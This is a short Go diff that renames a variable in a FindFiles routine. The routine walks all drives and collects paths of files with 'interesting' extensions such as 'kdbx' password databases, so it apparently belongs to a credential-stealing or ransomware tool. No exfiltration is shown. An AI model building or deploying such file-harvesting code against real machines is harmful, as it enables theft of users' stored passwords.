@@ -28,7 +28,7 @@ func FindFiles() []string {
 			"kdbx",
 		}
 
-		intList []string
+		interestingFilesList []string
 
 		drives = getdrives()
 	)
@@ -49,12 +49,12 @@ func FindFiles() []string {
 
 			for i := range interesting {
 				if strings.HasSuffix(info.Name(), interesting[i]) {
-					intList = append(intList, path)
+					interestingFilesList = append(interestingFilesList, path)
 				}
 			}
 			return nil
 		})
 	}
 
-	return intList
+	return interestingFilesList
 }
